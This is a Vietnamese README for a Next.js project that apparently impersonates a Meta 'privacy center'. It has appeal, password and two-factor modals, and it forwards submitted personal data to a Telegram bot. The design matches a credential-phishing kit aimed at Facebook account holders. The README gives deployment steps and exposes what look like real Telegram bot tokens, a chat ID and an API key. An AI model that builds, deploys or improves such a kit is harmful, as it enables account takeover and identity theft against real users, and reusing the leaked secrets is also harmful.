# Agency Partner - Next.js Project

Dự án này đã được chuyển đổi từ HTML tĩnh sang Next.js với TypeScript để có thể deploy trên Vercel.

## Cấu trúc dự án

```
├── app/
│   ├── api/
│   │   ├── submit-form/route.ts    # API endpoint để submit form
│   │   └── detect-location/route.ts # API endpoint để detect location
│   ├── layout.tsx                  # Root layout với metadata
│   ├── page.tsx                     # Trang chủ (từ index.html)
│   ├── globals.css                  # CSS toàn cục
│   └── privacy/
│       ├── layout.tsx              # Layout cho trang privacy
│       └── page.tsx                 # Trang privacy center (từ 200.html)
├── components/
│   ├── MetaLogo.tsx                # Component logo Meta
│   ├── PolicyCard.tsx               # Card hiển thị policy
│   ├── Sidebar.tsx                  # Sidebar navigation
│   ├── MobileHeader.tsx             # Header cho mobile
│   ├── ContentCard.tsx              # Nội dung chính
│   ├── AppealModal.tsx              # Modal form đăng ký
│   ├── PasswordModal.tsx            # Modal nhập password
│   ├── TwoFAModal.tsx               # Modal 2FA
│   └── SuccessModal.tsx             # Modal thành công
├── lib/
│   ├── telegram.ts                  # Utility functions cho Telegram
│   └── geolocation.ts               # Utility functions cho IP geolocation
├── public/                          # Assets tĩnh (images, favicons, etc.)
└── package.json
```

## Cài đặt

1. **Cài đặt dependencies:**
```bash
npm install
```

2. **Tạo file `.env.local` từ `.env.local.example`:**
```bash
cp .env.local.example .env.local
```

3. **Cấu hình API keys trong `.env.local`:**
```env
# IP Geolocation API Key
NEXT_PUBLIC_IPGEOLOCATION_API_KEY=4152c897e3fa46b6837cf4d91df45c25

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=8114953279:AAEN0t9oMK1HKMWyo4RqHuHih-Lb4MwgwpY
TELEGRAM_CHAT_ID=-4872697790
```

4. **Chạy development server:**
```bash
npm run dev
```

5. **Mở [http://localhost:3000](http://localhost:3000) trong trình duyệt.**

## Build và Deploy

### Build cho production:
```bash
npm run build
```

### Deploy lên Vercel:

1. **Cấu hình Environment Variables trên Vercel:**
   - Vào project settings trên Vercel
   - Thêm các biến môi trường:
     - `NEXT_PUBLIC_IPGEOLOCATION_API_KEY`
     - `TELEGRAM_BOT_TOKEN`
     - `TELEGRAM_CHAT_ID`

2. **Cách 1: Sử dụng Vercel CLI**
   ```bash
   npm i -g vercel
   vercel
   ```

3. **Cách 2: Deploy qua GitHub**
   - Push code lên GitHub repository
   - Vào [vercel.com](https://vercel.com)
   - Import project từ GitHub
   - Thêm environment variables trong Vercel dashboard
   - Vercel sẽ tự động detect Next.js và deploy

4. **Cách 3: Deploy trực tiếp**
   - Kéo thả thư mục dự án vào Vercel dashboard
   - Hoặc sử dụng Vercel CLI: `vercel --prod`

## Tính năng

- ✅ Server-side rendering với Next.js App Router
- ✅ TypeScript support
- ✅ Responsive design
- ✅ SEO optimized với metadata
- ✅ Modal forms với validation
- ✅ Sidebar navigation
- ✅ Mobile-friendly
- ✅ **IP Geolocation detection** - Tự động detect quốc gia từ IP
- ✅ **Telegram Bot integration** - Gửi form data đến Telegram
- ✅ **API Routes** - Server-side API endpoints

## API Endpoints

### POST `/api/submit-form`
Submit form data và gửi đến Telegram bot.

**Request Body:**
```json
{
  "fullName": "John Doe",
  "email": "john@example.com",
  "emailBusiness": "business@example.com",
  "pageName": "My Page",
  "phoneNumber": "+1234567890",
  "day": "15",
  "month": "06",
  "year": "1990",
  "note": "Optional note"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Form submitted successfully"
}
```

### GET `/api/detect-location`
Detect location từ IP address.

**Response:**
```json
{
  "ip": "123.456.789.0",
  "country": "United States",
  "countryCode": "US",
  "city": "New York",
  "region": "New York",
  "timezone": "America/New_York"
}
```

## Routes

- `/` - Trang chủ với các policy cards
- `/privacy` - Trang privacy center với sidebar và form đăng ký

## Bảo mật

- ✅ API keys được lưu trong biến môi trường (`.env.local`)
- ✅ File `.env.local` đã được thêm vào `.gitignore`
- ✅ Server-side API routes để bảo vệ credentials
- ✅ Không expose API keys ra client-side

## Lưu ý

- Dự án sử dụng Next.js 14 với App Router
- CSS được viết inline với styled-jsx cho các components
- Images sử dụng Next.js Image component để tối ưu
- Tất cả components đều là client components ("use client") để hỗ trợ interactivity
- API routes chạy server-side để bảo vệ API keys

## Hỗ trợ

Nếu gặp vấn đề khi deploy, kiểm tra:
1. Đảm bảo tất cả dependencies đã được cài đặt
2. Kiểm tra file `vercel.json` có đúng cấu hình
3. Đảm bảo các assets đã được copy vào `public/`
4. **Quan trọng:** Đảm bảo đã thêm environment variables trên Vercel dashboard
"# hanchedoanhnghiep-nextjs" 
